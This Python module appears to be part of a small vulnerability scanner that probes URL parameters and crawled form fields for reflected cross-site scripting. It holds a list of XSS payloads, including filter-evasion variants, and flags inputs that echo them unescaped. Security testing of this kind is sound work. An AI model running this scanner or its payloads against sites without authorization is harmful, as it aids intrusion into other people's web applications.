"""
Module: XSS Payload Tester
============================
Purpose:
    Tests web page input fields and URL parameters for Reflected Cross-Site
    Scripting (XSS) vulnerabilities. XSS allows attackers to inject malicious
    scripts into pages viewed by other users.

Logic:
    1. Parse the target URL for query parameters.
    2. Crawl the page to find HTML forms with text input fields.
    3. For each input point, inject XSS payloads.
    4. Check if the injected payload appears unescaped in the response HTML.
       If the raw payload echoes back, the parameter is potentially vulnerable.
    5. Return all findings with the triggering payload.

OWASP Reference:
    https://owasp.org/www-community/attacks/xss/

⚠ Disclaimer:
    This performs reflected XSS detection only (not stored or DOM-based).
    Use only on systems you own or have explicit written permission to test.
"""

import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from bs4 import BeautifulSoup
from colorama import Fore, Style


# ─────────────────────────────────────────────
#  XSS Payloads
# ─────────────────────────────────────────────

XSS_PAYLOADS = [
    # Basic script injection
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",

    # Event handler injection (bypasses basic script-tag filters)
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",

    # Attribute injection (breaks out of attribute value context)
    "\" onmouseover=\"alert(1)",
    "' onmouseover='alert(1)",
    "\"><img src=x onerror=alert(1)>",

    # Filter evasion variants
    "<ScRiPt>alert('XSS')</sCrIpT>",  # Mixed case
    "<script>alert`1`</script>",        # Template literal (bypasses parenthesis filters)
    "javascript:alert(1)",              # JavaScript protocol

    # HTML entity bypass attempts
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
]


class XSSTester:
    """Tests URL parameters and form fields for reflected XSS vulnerabilities."""

    def __init__(self, url: str, timeout: int = 10):
        self.url = url
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "Mozilla/5.0 (MiniVulnScanner/1.0)"})
        self.results = {
            "vulnerable_inputs": [],
            "tested_params": [],
            "tested_forms": 0,
        }

    def _extract_params(self) -> dict:
        """Parse URL query parameters."""
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)
        return {k: v[0] for k, v in params.items()}

    def _inject_url_param(self, base_url: str, param: str, params: dict, payload: str) -> str:
        """Build a URL with the XSS payload injected into one parameter."""
        modified = params.copy()
        modified[param] = payload
        parsed = urlparse(base_url)
        new_query = urlencode(modified)
        return urlunparse(parsed._replace(query=new_query))

    def _payload_reflected(self, response_text: str, payload: str) -> bool:
        """
        Check if the raw payload appears in the response HTML.
        A reflected payload means the server is echoing user input without
        sanitizing/encoding it — a strong indicator of XSS.
        """
        # Look for exact match in response body
        if payload in response_text:
            return True

        # Also check for the core dangerous tag/attribute (partial match)
        indicators = ["<script>", "onerror=", "onload=", "onmouseover=", "javascript:"]
        body_lower = response_text.lower()
        payload_lower = payload.lower()
        for indicator in indicators:
            if indicator in payload_lower and indicator in body_lower:
                return True

        return False

    def _test_url_params(self):
        """Test XSS via URL query parameters."""
        params = self._extract_params()
        if not params:
            return

        base_url = self.url.split("?")[0]
        self.results["tested_params"] = list(params.keys())
        print(f"  {Fore.GREEN}[✔] Found {len(params)} URL param(s): {list(params.keys())}{Style.RESET_ALL}\n")

        for param in params:
            print(f"  {Fore.WHITE}[→] Testing URL param: {Fore.YELLOW}'{param}'{Style.RESET_ALL}")
            found = False

            for payload in XSS_PAYLOADS:
                test_url = self._inject_url_param(base_url, param, params, payload)
                try:
                    resp = self.session.get(test_url, timeout=self.timeout)
                    if self._payload_reflected(resp.text, payload):
                        print(
                            f"    {Fore.RED}[!] POSSIBLE XSS! Param='{param}' "
                            f"Payload reflected: {payload[:60]}{Style.RESET_ALL}"
                        )
                        self.results["vulnerable_inputs"].append({
                            "type": "url_param",
                            "input": param,
                            "payload": payload,
                        })
                        found = True
                        break  # One confirmed hit is enough per param

                except requests.exceptions.RequestException:
                    pass

            if not found:
                print(f"    {Fore.GREEN}[✔] No reflected XSS detected for '{param}'{Style.RESET_ALL}")

    def _get_forms(self) -> list:
        """Crawl the target page and extract all HTML forms."""
        forms_data = []
        try:
            resp = self.session.get(self.url, timeout=self.timeout)
            soup = BeautifulSoup(resp.text, "html.parser")

            for form in soup.find_all("form"):
                action = form.get("action", "")
                method = form.get("method", "get").lower()

                # Resolve relative action URLs
                action_url = urljoin(self.url, action) if action else self.url

                inputs = []
                for tag in form.find_all(["input", "textarea"]):
                    tag_type = tag.get("type", "text").lower()
                    tag_name = tag.get("name", "")
                    if tag_name and tag_type not in ("submit", "button", "reset", "hidden", "image", "file"):
                        inputs.append(tag_name)

                if inputs:
                    forms_data.append({
                        "action": action_url,
                        "method": method,
                        "inputs": inputs,
                    })

        except Exception as e:
            print(f"  {Fore.YELLOW}[!] Could not crawl forms: {e}{Style.RESET_ALL}")

        return forms_data

    def _test_forms(self, forms: list):
        """Submit XSS payloads into discovered HTML form fields."""
        self.results["tested_forms"] = len(forms)

        for idx, form in enumerate(forms, 1):
            print(f"\n  {Fore.WHITE}[→] Testing Form #{idx} → {form['action']} ({form['method'].upper()}){Style.RESET_ALL}")

            for field in form["inputs"]:
                print(f"    {Fore.CYAN}[~] Field: '{field}'{Style.RESET_ALL}")
                found = False

                for payload in XSS_PAYLOADS:
                    # Build form data with all fields set to benign values,
                    # except the one we're currently testing
                    data = {f: "test" for f in form["inputs"]}
                    data[field] = payload

                    try:
                        if form["method"] == "post":
                            resp = self.session.post(form["action"], data=data, timeout=self.timeout)
                        else:
                            resp = self.session.get(form["action"], params=data, timeout=self.timeout)

                        if self._payload_reflected(resp.text, payload):
                            print(
                                f"    {Fore.RED}[!] POSSIBLE XSS in form field '{field}'! "
                                f"Payload: {payload[:60]}{Style.RESET_ALL}"
                            )
                            self.results["vulnerable_inputs"].append({
                                "type": "form_field",
                                "form_action": form["action"],
                                "input": field,
                                "payload": payload,
                            })
                            found = True
                            break

                    except requests.exceptions.RequestException:
                        pass

                if not found:
                    print(f"    {Fore.GREEN}[✔] No reflected XSS in field '{field}'{Style.RESET_ALL}")

    def run(self) -> dict:
        """Run full XSS scan: URL params + form fields."""
        print(f"  {Fore.CYAN}[*] Target: {self.url}{Style.RESET_ALL}\n")

        # ── Test URL query parameters
        params = self._extract_params()
        if params:
            print(f"  {Fore.YELLOW}[~] Testing URL query parameters...{Style.RESET_ALL}")
            self._test_url_params()
        else:
            print(f"  {Fore.YELLOW}[~] No URL parameters found. Checking for forms...{Style.RESET_ALL}")

        # ── Crawl and test HTML forms
        forms = self._get_forms()
        if forms:
            print(f"\n  {Fore.GREEN}[✔] Found {len(forms)} form(s) on the page.{Style.RESET_ALL}")
            self._test_forms(forms)
        else:
            print(f"  {Fore.YELLOW}[!] No testable forms discovered.{Style.RESET_ALL}")

        # ── Summary
        vuln_count = len(self.results["vulnerable_inputs"])
        print(f"\n  {Fore.WHITE}{'─' * 50}")
        print(f"  {Fore.CYAN}Forms Tested  : {len(forms)}")
        print(f"  {Fore.CYAN}Params Tested : {len(params)}")
        if vuln_count:
            print(f"  {Fore.RED}XSS Findings  : {vuln_count} potential vulnerability(ies){Style.RESET_ALL}")
        else:
            print(f"  {Fore.GREEN}XSS Findings  : 0 (no reflected XSS detected){Style.RESET_ALL}")

        return self.results
